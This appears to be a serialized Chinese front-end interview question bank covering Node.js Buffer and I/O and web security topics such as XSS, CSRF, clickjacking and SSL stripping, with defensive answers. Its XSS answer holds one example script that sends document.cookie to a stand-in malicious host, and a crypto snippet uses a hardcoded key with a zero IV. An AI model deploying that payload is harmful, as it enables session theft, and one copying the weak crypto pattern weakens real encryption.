很显然，使用EventEmitter之后，处理文件和处理异常的逻辑就被分开了，代码可读性和可维护性都提升了。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 很显然，使用EventEmitter之后，处理文件和处理异常的逻辑就被分开了，代码可读性和可维护性都提升了。","task":false,"loose":false,"text":"很显然，使用EventEmitter之后，处理文件和处理异常的逻辑就被分开了，代码可读性和可维护性都提升了。","tokens":[{"type":"text","raw":"很显然，使用EventEmitter之后，处理文件和处理异常的逻辑就被分开了，代码可读性和可维护性都提升了。","text":"很显然，使用EventEmitter之后，处理文件和处理异常的逻辑就被分开了，代码可读性和可维护性都提升了。","tokens":[{"type":"text","raw":"很显然，使用EventEmitter之后，处理文件和处理异常的逻辑就被分开了，代码可读性和可维护性都提升了。","text":"很显然，使用EventEmitter之后，处理文件和处理异常的逻辑就被分开了，代码可读性和可维护性都提升了。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 23.Buffer怎么理解，有什么应用？\\n\\n","depth":2,"text":"23.Buffer怎么理解，有什么应用？","tokens":[{"type":"text","raw":"23.Buffer怎么理解，有什么应用？","text":"23.Buffer怎么理解，有什么应用？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- Buffer对象是一个类似于数组的对象，它的每个元素都是一个表示 8 位字节的整数。\\n\\n- 可以将其看作是一个字节数组，用来存储和操作二进制数据。\\n\\n- 应用场景：\\n\\n- 网络通信：可以使用Buffer.from()方法将字符串转换为二进制数据，然后使用net模块进行网络通信：","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- Buffer对象是一个类似于数组的对象，它的每个元素都是一个表示 8 位字节的整数。\\n\\n","task":false,"loose":true,"text":"Buffer对象是一个类似于数组的对象，它的每个元素都是一个表示 8 位字节的整数。\\n","tokens":[{"type":"text","raw":"Buffer对象是一个类似于数组的对象，它的每个元素都是一个表示 8 位字节的整数。\\n","text":"Buffer对象是一个类似于数组的对象，它的每个元素都是一个表示 8 位字节的整数。","tokens":[{"type":"text","raw":"Buffer对象是一个类似于数组的对象，它的每个元素都是一个表示 8 位字节的整数。","text":"Buffer对象是一个类似于数组的对象，它的每个元素都是一个表示 8 位字节的整数。","escaped":false}]}]},{"type":"list_item","raw":"- 可以将其看作是一个字节数组，用来存储和操作二进制数据。\\n\\n","task":false,"loose":true,"text":"可以将其看作是一个字节数组，用来存储和操作二进制数据。\\n","tokens":[{"type":"text","raw":"可以将其看作是一个字节数组，用来存储和操作二进制数据。\\n","text":"可以将其看作是一个字节数组，用来存储和操作二进制数据。","tokens":[{"type":"text","raw":"可以将其看作是一个字节数组，用来存储和操作二进制数据。","text":"可以将其看作是一个字节数组，用来存储和操作二进制数据。","escaped":false}]}]},{"type":"list_item","raw":"- 应用场景：\\n\\n","task":false,"loose":true,"text":"应用场景：\\n","tokens":[{"type":"text","raw":"应用场景：\\n","text":"应用场景：","tokens":[{"type":"text","raw":"应用场景：","text":"应用场景：","escaped":false}]}]},{"type":"list_item","raw":"- 网络通信：可以使用Buffer.from()方法将字符串转换为二进制数据，然后使用net模块进行网络通信：","task":false,"loose":true,"text":"网络通信：可以使用Buffer.from()方法将字符串转换为二进制数据，然后使用net模块进行网络通信：","tokens":[{"type":"text","raw":"网络通信：可以使用Buffer.from()方法将字符串转换为二进制数据，然后使用net模块进行网络通信：","text":"网络通信：可以使用Buffer.from()方法将字符串转换为二进制数据，然后使用net模块进行网络通信：","tokens":[{"type":"text","raw":"网络通信：可以使用Buffer.from()方法将字符串转换为二进制数据，然后使用net模块进行网络通信：","text":"网络通信：可以使用Buffer.from()方法将字符串转换为二进制数据，然后使用net模块进行网络通信：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst net = require(\'net\');\\n\\nconst client = net.createConnection({ port: 8080 }, () => {\\n  // 将字符串转换为二进制数据\\n  const data = Buffer.from(\'Hello, world!\', \'utf8\');\\n\\n  // 发送数据\\n  client.write(data);\\n});\\n\\n```","lang":"js","text":"const net = require(\'net\');\\n\\nconst client = net.createConnection({ port: 8080 }, () => {\\n  // 将字符串转换为二进制数据\\n  const data = Buffer.from(\'Hello, world!\', \'utf8\');\\n\\n  // 发送数据\\n  client.write(data);\\n});\\n"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 文件操作，用Buffer来存储文件数据：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 文件操作，用Buffer来存储文件数据：","task":false,"loose":false,"text":"文件操作，用Buffer来存储文件数据：","tokens":[{"type":"text","raw":"文件操作，用Buffer来存储文件数据：","text":"文件操作，用Buffer来存储文件数据：","tokens":[{"type":"text","raw":"文件操作，用Buffer来存储文件数据：","text":"文件操作，用Buffer来存储文件数据：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst fs = require(\'fs\');\\n\\n// 读取文件，并将数据存储到 Buffer 对象中\\nconst data = fs.readFileSync(\'/path/to/file\');\\n\\n// 处理数据\\n// ...\\n```","lang":"js","text":"const fs = require(\'fs\');\\n\\n// 读取文件，并将数据存储到 Buffer 对象中\\nconst data = fs.readFileSync(\'/path/to/file\');\\n\\n// 处理数据\\n// ..."},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 加密解密，例如，可以使用 crypto 模块创建加密解密算法需要的二进制数据：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 加密解密，例如，可以使用 crypto 模块创建加密解密算法需要的二进制数据：","task":false,"loose":false,"text":"加密解密，例如，可以使用 crypto 模块创建加密解密算法需要的二进制数据：","tokens":[{"type":"text","raw":"加密解密，例如，可以使用 crypto 模块创建加密解密算法需要的二进制数据：","text":"加密解密，例如，可以使用 crypto 模块创建加密解密算法需要的二进制数据：","tokens":[{"type":"text","raw":"加密解密，例如，可以使用 crypto 模块创建加密解密算法需要的二进制数据：","text":"加密解密，例如，可以使用 crypto 模块创建加密解密算法需要的二进制数据：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nconst crypto = require(\'crypto\');\\n\\n// 创建加密解密算法需要的二进制数据\\nconst key = Buffer.from(\'mysecretkey\', \'utf8\');\\nconst iv = Buffer.alloc(16);\\n\\n// 创建加密解密算法对象\\nconst cipher = crypto.createCipheriv(\'aes-256-cbc\', key, iv);\\n\\n// 加密数据\\nconst encrypted = Buffer.concat([cipher.update(data), cipher.final()]);\\n```","lang":"js","text":"\\nconst crypto = require(\'crypto\');\\n\\n// 创建加密解密算法需要的二进制数据\\nconst key = Buffer.from(\'mysecretkey\', \'utf8\');\\nconst iv = Buffer.alloc(16);\\n\\n// 创建加密解密算法对象\\nconst cipher = crypto.createCipheriv(\'aes-256-cbc\', key, iv);\\n\\n// 加密数据\\nconst encrypted = Buffer.concat([cipher.update(data), cipher.final()]);"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 图像处理：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 图像处理：","task":false,"loose":false,"text":"图像处理：","tokens":[{"type":"text","raw":"图像处理：","text":"图像处理：","tokens":[{"type":"text","raw":"图像处理：","text":"图像处理：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nconst fs = require(\'fs\');\\nconst sharp = require(\'sharp\');\\n\\n// 读取图片文件，并将数据存储到 Buffer 对象中\\nconst data = fs.readFileSync(\'/path/to/image\');\\n\\n// 处理图片\\nsharp(data)\\n  .resize(200, 200)\\n  .toFile(\'/path/to/resized-image\', (err, info) => {\\n    // ...\\n  });\\n\\n```","lang":"js","text":"\\nconst fs = require(\'fs\');\\nconst sharp = require(\'sharp\');\\n\\n// 读取图片文件，并将数据存储到 Buffer 对象中\\nconst data = fs.readFileSync(\'/path/to/image\');\\n\\n// 处理图片\\nsharp(data)\\n  .resize(200, 200)\\n  .toFile(\'/path/to/resized-image\', (err, info) => {\\n    // ...\\n  });\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 24. 什么是I/O？\\n\\n","depth":2,"text":"24. 什么是I/O？","tokens":[{"type":"text","raw":"24. 什么是I/O？","text":"24. 什么是I/O？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 概念：计算机里所谓的I/O指的是输入和输出，但对于前端同学而言，这个定义可能不太好理解。简单点说，需要等待的任务都可以称为I/O任务，比如前端的事件处理、网络请求、定时器，后端的文件处理、网络请求、数据库操作，这些都属于I/O任务。\\n\\n- 异步I/O：以网络请求任务为例，传统的同步I/O指的是一个一个排队执行，一个执行完了再执行下一个，即使线程空闲，也不能执行其他任务。\\n\\n- 而异步I/O会返回一个标记，告诉调用者 I/O 操作已经开始，但不会阻塞线程。当 I/O 操作完成时，会调用注册的回调函数，将结果返回给调用者。\\n\\n- 网络通信：可以使用Buffer.from()方法将字符串转换为二进制数据，然后使用net模块进行网络通信：\\n\\n- 异步I/O使得程序在执行 I/O 操作时不必等待，提高了程序的并发性能。\\n\\n- 听起来异步I/O很好，那为什么同步I/O依然会存在？\\n\\n- 传统的同步I/O操作比异步I/O操作更容易理解和编写。异步编程需要开发人员具备较高的技能水平，以及对事件循环、回调函数等概念的深入理解。\\n\\n- 对于某些小规模的应用程序或者一些低频次的I/O操作，使用异步I/O可能不会带来很大的性能提升，而且可能会增加代码的复杂性\\n\\n- 对于一些CPU密集型任务，传统I/O操作可能比异步I/O更快，因为异步I/O 会在I/O操作执行期间增加额外的上下文切换和事件处理负担，从而降低了程序的性能。\\n\\n- CPU密集和I/O密集：\\n\\n- CPU密集任务指的是纯计算任务。\\n\\n- I/O密集的任务指的是需要等待的任务。所谓的高并发，显然属于I/O密集型任务。\\n","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 概念：计算机里所谓的I/O指的是输入和输出，但对于前端同学而言，这个定义可能不太好理解。简单点说，需要等待的任务都可以称为I/O任务，比如前端的事件处理、网络请求、定时器，后端的文件处理、网络请求、数据库操作，这些都属于I/O任务。\\n\\n","task":false,"loose":true,"text":"概念：计算机里所谓的I/O指的是输入和输出，但对于前端同学而言，这个定义可能不太好理解。简单点说，需要等待的任务都可以称为I/O任务，比如前端的事件处理、网络请求、定时器，后端的文件处理、网络请求、数据库操作，这些都属于I/O任务。\\n","tokens":[{"type":"text","raw":"概念：计算机里所谓的I/O指的是输入和输出，但对于前端同学而言，这个定义可能不太好理解。简单点说，需要等待的任务都可以称为I/O任务，比如前端的事件处理、网络请求、定时器，后端的文件处理、网络请求、数据库操作，这些都属于I/O任务。\\n","text":"概念：计算机里所谓的I/O指的是输入和输出，但对于前端同学而言，这个定义可能不太好理解。简单点说，需要等待的任务都可以称为I/O任务，比如前端的事件处理、网络请求、定时器，后端的文件处理、网络请求、数据库操作，这些都属于I/O任务。","tokens":[{"type":"text","raw":"概念：计算机里所谓的I/O指的是输入和输出，但对于前端同学而言，这个定义可能不太好理解。简单点说，需要等待的任务都可以称为I/O任务，比如前端的事件处理、网络请求、定时器，后端的文件处理、网络请求、数据库操作，这些都属于I/O任务。","text":"概念：计算机里所谓的I/O指的是输入和输出，但对于前端同学而言，这个定义可能不太好理解。简单点说，需要等待的任务都可以称为I/O任务，比如前端的事件处理、网络请求、定时器，后端的文件处理、网络请求、数据库操作，这些都属于I/O任务。","escaped":false}]}]},{"type":"list_item","raw":"- 异步I/O：以网络请求任务为例，传统的同步I/O指的是一个一个排队执行，一个执行完了再执行下一个，即使线程空闲，也不能执行其他任务。\\n\\n","task":false,"loose":true,"text":"异步I/O：以网络请求任务为例，传统的同步I/O指的是一个一个排队执行，一个执行完了再执行下一个，即使线程空闲，也不能执行其他任务。\\n","tokens":[{"type":"text","raw":"异步I/O：以网络请求任务为例，传统的同步I/O指的是一个一个排队执行，一个执行完了再执行下一个，即使线程空闲，也不能执行其他任务。\\n","text":"异步I/O：以网络请求任务为例，传统的同步I/O指的是一个一个排队执行，一个执行完了再执行下一个，即使线程空闲，也不能执行其他任务。","tokens":[{"type":"text","raw":"异步I/O：以网络请求任务为例，传统的同步I/O指的是一个一个排队执行，一个执行完了再执行下一个，即使线程空闲，也不能执行其他任务。","text":"异步I/O：以网络请求任务为例，传统的同步I/O指的是一个一个排队执行，一个执行完了再执行下一个，即使线程空闲，也不能执行其他任务。","escaped":false}]}]},{"type":"list_item","raw":"- 而异步I/O会返回一个标记，告诉调用者 I/O 操作已经开始，但不会阻塞线程。当 I/O 操作完成时，会调用注册的回调函数，将结果返回给调用者。\\n\\n","task":false,"loose":true,"text":"而异步I/O会返回一个标记，告诉调用者 I/O 操作已经开始，但不会阻塞线程。当 I/O 操作完成时，会调用注册的回调函数，将结果返回给调用者。\\n","tokens":[{"type":"text","raw":"而异步I/O会返回一个标记，告诉调用者 I/O 操作已经开始，但不会阻塞线程。当 I/O 操作完成时，会调用注册的回调函数，将结果返回给调用者。\\n","text":"而异步I/O会返回一个标记，告诉调用者 I/O 操作已经开始，但不会阻塞线程。当 I/O 操作完成时，会调用注册的回调函数，将结果返回给调用者。","tokens":[{"type":"text","raw":"而异步I/O会返回一个标记，告诉调用者 I/O 操作已经开始，但不会阻塞线程。当 I/O 操作完成时，会调用注册的回调函数，将结果返回给调用者。","text":"而异步I/O会返回一个标记，告诉调用者 I/O 操作已经开始，但不会阻塞线程。当 I/O 操作完成时，会调用注册的回调函数，将结果返回给调用者。","escaped":false}]}]},{"type":"list_item","raw":"- 网络通信：可以使用Buffer.from()方法将字符串转换为二进制数据，然后使用net模块进行网络通信：\\n\\n","task":false,"loose":true,"text":"网络通信：可以使用Buffer.from()方法将字符串转换为二进制数据，然后使用net模块进行网络通信：\\n","tokens":[{"type":"text","raw":"网络通信：可以使用Buffer.from()方法将字符串转换为二进制数据，然后使用net模块进行网络通信：\\n","text":"网络通信：可以使用Buffer.from()方法将字符串转换为二进制数据，然后使用net模块进行网络通信：","tokens":[{"type":"text","raw":"网络通信：可以使用Buffer.from()方法将字符串转换为二进制数据，然后使用net模块进行网络通信：","text":"网络通信：可以使用Buffer.from()方法将字符串转换为二进制数据，然后使用net模块进行网络通信：","escaped":false}]}]},{"type":"list_item","raw":"- 异步I/O使得程序在执行 I/O 操作时不必等待，提高了程序的并发性能。\\n\\n","task":false,"loose":true,"text":"异步I/O使得程序在执行 I/O 操作时不必等待，提高了程序的并发性能。\\n","tokens":[{"type":"text","raw":"异步I/O使得程序在执行 I/O 操作时不必等待，提高了程序的并发性能。\\n","text":"异步I/O使得程序在执行 I/O 操作时不必等待，提高了程序的并发性能。","tokens":[{"type":"text","raw":"异步I/O使得程序在执行 I/O 操作时不必等待，提高了程序的并发性能。","text":"异步I/O使得程序在执行 I/O 操作时不必等待，提高了程序的并发性能。","escaped":false}]}]},{"type":"list_item","raw":"- 听起来异步I/O很好，那为什么同步I/O依然会存在？\\n\\n","task":false,"loose":true,"text":"听起来异步I/O很好，那为什么同步I/O依然会存在？\\n","tokens":[{"type":"text","raw":"听起来异步I/O很好，那为什么同步I/O依然会存在？\\n","text":"听起来异步I/O很好，那为什么同步I/O依然会存在？","tokens":[{"type":"text","raw":"听起来异步I/O很好，那为什么同步I/O依然会存在？","text":"听起来异步I/O很好，那为什么同步I/O依然会存在？","escaped":false}]}]},{"type":"list_item","raw":"- 传统的同步I/O操作比异步I/O操作更容易理解和编写。异步编程需要开发人员具备较高的技能水平，以及对事件循环、回调函数等概念的深入理解。\\n\\n","task":false,"loose":true,"text":"传统的同步I/O操作比异步I/O操作更容易理解和编写。异步编程需要开发人员具备较高的技能水平，以及对事件循环、回调函数等概念的深入理解。\\n","tokens":[{"type":"text","raw":"传统的同步I/O操作比异步I/O操作更容易理解和编写。异步编程需要开发人员具备较高的技能水平，以及对事件循环、回调函数等概念的深入理解。\\n","text":"传统的同步I/O操作比异步I/O操作更容易理解和编写。异步编程需要开发人员具备较高的技能水平，以及对事件循环、回调函数等概念的深入理解。","tokens":[{"type":"text","raw":"传统的同步I/O操作比异步I/O操作更容易理解和编写。异步编程需要开发人员具备较高的技能水平，以及对事件循环、回调函数等概念的深入理解。","text":"传统的同步I/O操作比异步I/O操作更容易理解和编写。异步编程需要开发人员具备较高的技能水平，以及对事件循环、回调函数等概念的深入理解。","escaped":false}]}]},{"type":"list_item","raw":"- 对于某些小规模的应用程序或者一些低频次的I/O操作，使用异步I/O可能不会带来很大的性能提升，而且可能会增加代码的复杂性\\n\\n","task":false,"loose":true,"text":"对于某些小规模的应用程序或者一些低频次的I/O操作，使用异步I/O可能不会带来很大的性能提升，而且可能会增加代码的复杂性\\n","tokens":[{"type":"text","raw":"对于某些小规模的应用程序或者一些低频次的I/O操作，使用异步I/O可能不会带来很大的性能提升，而且可能会增加代码的复杂性\\n","text":"对于某些小规模的应用程序或者一些低频次的I/O操作，使用异步I/O可能不会带来很大的性能提升，而且可能会增加代码的复杂性","tokens":[{"type":"text","raw":"对于某些小规模的应用程序或者一些低频次的I/O操作，使用异步I/O可能不会带来很大的性能提升，而且可能会增加代码的复杂性","text":"对于某些小规模的应用程序或者一些低频次的I/O操作，使用异步I/O可能不会带来很大的性能提升，而且可能会增加代码的复杂性","escaped":false}]}]},{"type":"list_item","raw":"- 对于一些CPU密集型任务，传统I/O操作可能比异步I/O更快，因为异步I/O 会在I/O操作执行期间增加额外的上下文切换和事件处理负担，从而降低了程序的性能。\\n\\n","task":false,"loose":true,"text":"对于一些CPU密集型任务，传统I/O操作可能比异步I/O更快，因为异步I/O 会在I/O操作执行期间增加额外的上下文切换和事件处理负担，从而降低了程序的性能。\\n","tokens":[{"type":"text","raw":"对于一些CPU密集型任务，传统I/O操作可能比异步I/O更快，因为异步I/O 会在I/O操作执行期间增加额外的上下文切换和事件处理负担，从而降低了程序的性能。\\n","text":"对于一些CPU密集型任务，传统I/O操作可能比异步I/O更快，因为异步I/O 会在I/O操作执行期间增加额外的上下文切换和事件处理负担，从而降低了程序的性能。","tokens":[{"type":"text","raw":"对于一些CPU密集型任务，传统I/O操作可能比异步I/O更快，因为异步I/O 会在I/O操作执行期间增加额外的上下文切换和事件处理负担，从而降低了程序的性能。","text":"对于一些CPU密集型任务，传统I/O操作可能比异步I/O更快，因为异步I/O 会在I/O操作执行期间增加额外的上下文切换和事件处理负担，从而降低了程序的性能。","escaped":false}]}]},{"type":"list_item","raw":"- CPU密集和I/O密集：\\n\\n","task":false,"loose":true,"text":"CPU密集和I/O密集：\\n","tokens":[{"type":"text","raw":"CPU密集和I/O密集：\\n","text":"CPU密集和I/O密集：","tokens":[{"type":"text","raw":"CPU密集和I/O密集：","text":"CPU密集和I/O密集：","escaped":false}]}]},{"type":"list_item","raw":"- CPU密集任务指的是纯计算任务。\\n\\n","task":false,"loose":true,"text":"CPU密集任务指的是纯计算任务。\\n","tokens":[{"type":"text","raw":"CPU密集任务指的是纯计算任务。\\n","text":"CPU密集任务指的是纯计算任务。","tokens":[{"type":"text","raw":"CPU密集任务指的是纯计算任务。","text":"CPU密集任务指的是纯计算任务。","escaped":false}]}]},{"type":"list_item","raw":"- I/O密集的任务指的是需要等待的任务。所谓的高并发，显然属于I/O密集型任务。","task":false,"loose":true,"text":"I/O密集的任务指的是需要等待的任务。所谓的高并发，显然属于I/O密集型任务。","tokens":[{"type":"text","raw":"I/O密集的任务指的是需要等待的任务。所谓的高并发，显然属于I/O密集型任务。","text":"I/O密集的任务指的是需要等待的任务。所谓的高并发，显然属于I/O密集型任务。","tokens":[{"type":"text","raw":"I/O密集的任务指的是需要等待的任务。所谓的高并发，显然属于I/O密集型任务。","text":"I/O密集的任务指的是需要等待的任务。所谓的高并发，显然属于I/O密集型任务。","escaped":false}]}]}]}]},{"key":"前端安全","content":"<h1>前端安全</h1>\\n<h2>XSS 攻击</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>:1</strong> XSS（Cross Site Scripting，跨站脚本），即攻击者往 Web 页面里嵌入恶意的客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器上执行，进而达到攻击者的目的。【获取用户的 Cookie、导航到恶意网站、携带木马】</li>\\n<li><strong>:2</strong> 防御：</li>\\n</ul>\\n<blockquote>\\n<p>1、对输入和 URL 参数进行过滤，过滤掉会导致脚本执行的相关内容。<br>2、对动态输出到页面的内容进行 html 编码，使脚本无法在浏览器中执行。</p>\\n</blockquote>\\n<h2>CSRF 攻击</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>:1</strong> CSRF（Cross Site Request Forgery，跨站请求伪造），即在别的站点伪造了一个请求，在受害者访问一个网站时，其 cookie 还没有过期的情况下，攻击者伪造一个链接地址发送受害者并欺骗让其点击，从而形成 CSRF 攻击。</li>\\n<li><strong>:4</strong> 防御：</li>\\n</ul>\\n<blockquote>\\n<p>1、验证 HTTP 的 Referer 字段。<br>2、在请求地址中添加 token 并验证。<br>3、在 HTTP 头中自定义属性并验证。<br>4、涉及到数据修改操作严格使用 post 请求而不是 get 请求。  </p>\\n<blockquote>\\n<p>get 的 URL 会被放在浏览器历史和 WEB 服务器日志里面，如果把关键数据放在 get 里面，被人偷窥了浏览器，会造成数据泄露。而 post 日志没有记录，也不会保留 URL，只要数据库服务器不被入侵，基本还是安全的。</p>\\n</blockquote>\\n</blockquote>\\n<h2>iframe 风险</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>:1</strong> 前端页面需要用到第三方提供的页面组件，通常会以 iframe 的方式引入，比如广告插件等。这些第三方提供的插件可以运行 js 脚本、flash 插件等，破坏用户体验。</li>\\n<li><strong>:1</strong> 防御：</li>\\n</ul>\\n<blockquote>\\n<p>iframe 中有一个叫做 sandbox 的安全属性，通过它可以对 iframe 的行为进行各种限制，充分实现“最小权限”原则。  </p>\\n</blockquote>\\n<h2>点击劫持</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<ul>\\n<li><strong>:1</strong> 通过 iframe 使用别人提供的内容时，自己的页面也可能正在被不法分子放到他们精心构造的 iframe 中，进行点击劫持攻击。这是一种欺骗性强、用户参与高的攻击。</li>\\n<li><strong>:2</strong> 通常的攻击步骤是这样的：</li>\\n</ul>\\n<blockquote>\\n<p>1、攻击者构造一个诱导用户点击的内容，比如页面小游戏。<br>2、将我们的页面放入到 iframe 当中。<br>3、利用 z-index 等 CSS 样式将这个 iframe 叠加到小游戏的垂直方向的正上方。<br>4、把 iframe 设置为100%透明度。<br>5、受害者访问到这个页面后，肉眼看到的是一个小游戏，如果受到诱导进行了点击的话，实际上点击到的却是 iframe 中的我们自己的页面。</p>\\n</blockquote>\\n<ul>\\n<li><strong>:1</strong> 危害：</li>\\n</ul>\\n<blockquote>\\n<p>攻击者利用了受害者的用户身份，在其不知情的情况下进行一些操作。如果是删除某个重要文件记录，或者窃取敏感信息，那么造成的危害就难以承受。</p>\\n</blockquote>\\n<ul>\\n<li><strong>:2</strong> 防御：</li>\\n</ul>\\n<blockquote>\\n<p>1、使用 X-Frame-Options：DENY 这个 HTTP Header 来明确的告知浏览器，不要把当前HTTP响应中的内容在HTML Frame 中显示出来。\\n2、判断当前页面是否被嵌入到 iframe 中。</p>\\n</blockquote>\\n<h2>第三方依赖包带来的问题</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p><strong>:1</strong> 现在绝大多数的开发都是在借助开发框架和各种类库进行快速开发。这样做虽然方便快速，但是与此同时也存在安全风险，如果这些来自第三方的代码有安全漏洞，那么对应用整体的安全性依然会造成严峻的挑战。\\n比如 Node.js 有一些已知的安全漏洞，比如 CVE-2017-11499，可能导致前端应用受到 DoS 攻击。</p>\\n</li>\\n<li><p><strong>:1</strong> 防御：</p>\\n</li>\\n</ul>\\n<blockquote>\\n<p>使用 NSP(Node Security Platform)、Snyk 等等这类工具。</p>\\n</blockquote>\\n<h2>https 存在的风险</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>:1</strong> 即使是服务器端开启了 https，也还是存在安全隐患，黑客可以利用 SSL Stripping 这种攻击手段，强制让 https 降级回 http，从而继续进行中间人攻击。</li>\\n<li><strong>:2</strong> 过程:</li>\\n</ul>\\n<blockquote>\\n<p>1、用户在浏览器里输入 URL 的时候往往不是从 https:// 开始的，而是直接从域名开始输入；<br>2、随后浏览器向服务器发起 http 通信;<br>3、攻击者把服务器端返回的跳转到 https 页面的响应拦截了，并且代替客户端和服务器端进行后续的通信。  </p>\\n</blockquote>\\n<ul>\\n<li><strong>:1</strong> 防御：</li>\\n</ul>\\n<blockquote>\\n<p>使用 HSTS（HTTP Strict Transport Security），通过 HTTP Header 以及一个预加载的清单，来告知浏览器在和网站进行通信的时候强制性使用 HTTPS，而不是通过明文的HTTP进行通信。\\n 并且当遇到证书或者链接不安全的时候，则首先警告用户，并且不再让用户继续进行不安全的通信。</p>\\n</blockquote>\\n<h2>什么是跨站脚本攻击（XSS）？如何防范？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（9 分）</h4>\\n<details>\\n\\n<ul>\\n<li><p><strong>2：</strong> 跨站脚本攻击（XSS）是一种常见的网络安全漏洞。它允许攻击者将恶意脚本（通常是 JavaScript，但也可以是其他客户端脚本语言，如 VBScript）注\\n入到目标网站中。这些恶意脚本在用户的浏览器中执行，因为浏览器会把它当作正常的脚本代码来解析。例如：\\n一个存在 XSS 漏洞的网站有一个评论功能。攻击者在评论框中输入一段包含恶意 JavaScript 代码的评论，如\\n<code>&lt;script&gt;document.location = &#39;http://malicious - site.com?cookie=&#39; + document.cookie&lt;/script&gt;</code>。当其他用户访问包含这条评论\\n的页面时，他们的浏览器会执行这段脚本。这段脚本会获取用户的浏览器 cookie 信息（其中可能包含用户的登录凭证等敏感信息），并将其发送到攻击者指定的恶意\\n网站<code>（http://malicious - site.com）</code>。</p>\\n</li>\\n<li><p><strong>1：</strong> 输入验证和过滤：<br/>\\n&emsp;对用户输入进行严格验证：在接收用户输入的地方（如表单提交、URL 参数等），要验证输入的内容是否符合预期的格式。例如，如果是一个只允许输入数字的字段，要检查输入是否真的是数字。\\n&emsp;过滤特殊字符：对于可能包含脚本代码的字符进行过滤。例如，对&lt;、&gt;、&amp;、&quot;、&#39;等 HTML 特殊字符进行转义。在 JavaScript 中，可以使用encodeURIComponent()函数对用户输入的 URL\\n 参数进行编码，在服务器端也可以使用相应的函数来处理。例如在 PHP 中，使用htmlspecialchars()函数来转义 HTML 中的特殊字符，这样可以防止用户输入的内容被当作 HTML 标签或脚本解析。</p>\\n</li>\\n<li><p><strong>2：</strong> 